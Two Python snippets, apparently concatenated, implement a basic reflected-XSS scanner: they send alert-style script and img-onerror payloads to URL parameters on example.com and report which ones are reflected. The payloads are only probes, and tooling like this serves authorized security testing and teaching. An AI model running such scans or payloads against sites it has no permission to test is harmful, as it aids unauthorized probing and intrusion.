import requests
import re

def scan_url(url):
    parameters = []
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"{url} is up")
            parameters = re.findall("(?<=name=\")[^\"]+", response.text)
        else:
            print(f"{url} is down")
    except requests.exceptions.RequestException as e:
        print(f"{url} is down")
    
    if parameters:
        payloads = [
            "<script>alert('XSS')</script>",
            "><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>"
        ]
        for parameter in parameters:
            for payload in payloads:
                try:
                    response = requests.get(url + "?" + parameter + "=" + payload)
                    if re.search("<script>alert\('XSS'\)</script>", response.text) or re.search("<img src=x onerror=alert\('XSS'\)>", response.text):
                        print(f"{url} is vulnerable to XSS with payload: {payload} in parameter: {parameter}")
                        break
                except requests.exceptions.RequestException as e:
                    print(f"Error: {e}")

if __name__ == "__main__":
    url = "https://example.com/"
    scan_url(url)
import requests

payloads = [
    "<script>alert('XSS')</script>",
    "><script>alert('XSS')</script><",
    # ...
]

target_urls = [
    "http://example.com/search?q=",
    "http://example.com/profile?name=",
    # ...
]

for target_url in target_urls:
    for payload in payloads:
        response = requests.get(target_url + payload)
        if payload in response.text:
            print(f"{target_url} is vulnerable to XSS using payload {payload}.")
            break
    else:
        print(f"{target_url} is not vulnerable to XSS.")
